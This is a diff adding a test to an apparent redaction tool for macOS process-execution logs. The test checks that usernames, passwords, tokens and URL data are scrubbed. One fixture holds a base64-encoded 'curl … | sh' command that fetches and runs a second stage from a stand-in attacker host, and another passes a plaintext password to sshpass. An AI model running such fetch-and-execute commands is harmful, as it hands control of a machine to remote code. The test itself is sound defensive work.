@@ -2593,6 +2593,43 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
     }
   });
 
+  test('a token needs its context, a run in a URL is keyed once, and wrappers keep their own options', () => {
+    const app = '/Users/jdoe/Downloads/Ring Bearer Installer.app/Contents/MacOS/Installer';
+    const RUN = 'Y3VybCAtcyBodHRwczovL2V2aWwuZXhhbXBsZS5uZXQvc3RhZ2UyIHwgc2g';
+    const url = `https://evil.example.net/p?sig=${RUN}%3D`;
+    const input = [
+      esExec(child(1670), userProc(1670, app), { args: [app, '--mode', 'Bearer authentication failed'], cwd: '/', env: JDOE_ENV, seq: 1 }),
+      run(1671, '/bin/sh', ['sh', '-c', 'echo "Bearer authentication failed for jdoe"'], '/', 2),
+      run(1672, '/usr/bin/open', ['open', url], '/', 3),
+      run(1673, '/bin/sh', ['sh', '-c', `curl -o /dev/null "${url}"`], '/', 4),
+      run(1674, '/usr/bin/curl', ['curl', '-o', '/dev/null', url], '/', 5),
+      run(1675, '/usr/bin/true', ['true'], '/', 6, [...JDOE_ENV, '/Users/jdoe/Board minutes=1']),
+      run(1676, '/usr/local/bin/sshpass', ['sshpass', '-p', 'pw12', 'ssh', '-p', '2222', 'host.example.com'], '/', 7),
+      run(1677, '/usr/bin/ssh', ['ssh', 'host.example.com', 'TOKEN=t13', 'make'], '/', 8),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const ev = events(r.out);
+      const args = ev.map(e => e.event.exec.args as string[]);
+      const R = '<redacted>';
+      const cleanedApp = ev[0]!.event.exec.target.executable.path as string;
+      expect(cleanedApp).toBe('/Users/user1/Downloads/Ring Bearer Installer.app/Contents/MacOS/Installer');
+      expect(args[0]).toEqual([cleanedApp, '--mode', 'Bearer authentication failed']);
+      expect(args[1]![2]).toBe('echo "Bearer authentication failed for user1"');
+      const d = keyed(r.key, 'data');
+      const sig = `https://evil.example.net/${keyed(r.key, 'name').get('p')}?sig=${d.get(`${RUN}%3D`)}`;
+      expect(args[2]).toEqual(['open', sig]);
+      expect(args[3]![2]).toBe(`curl -o /dev/null "${sig}"`);
+      expect(args[4]).toEqual(['curl', '-o', '/dev/null', sig]);
+      expect(ev[5]!.event.exec.env).toContain(R);
+      expect(args[6]).toEqual(['sshpass', '-p', R, 'ssh', '-p', '2222', 'host.example.com']);
+      expect(args[7]).toEqual(['ssh', 'host.example.com', `TOKEN=${R}`, 'make']);
+      expect(r.out).not.toMatch(/Board|pw12|t13|Y3VybC/);
+      cleanKey(r.key);
+      expect(r.summary['redacted']).toBe('2');
+      sameFindings(input, r.out);
+    }
+  });
+
   test('a credential shape in a path is redacted where it stands, and the path keeps its shape', () => {
     const input = [
       esCreate(zsh, { path: `/tmp/${AKIA}.txt` }, 1),
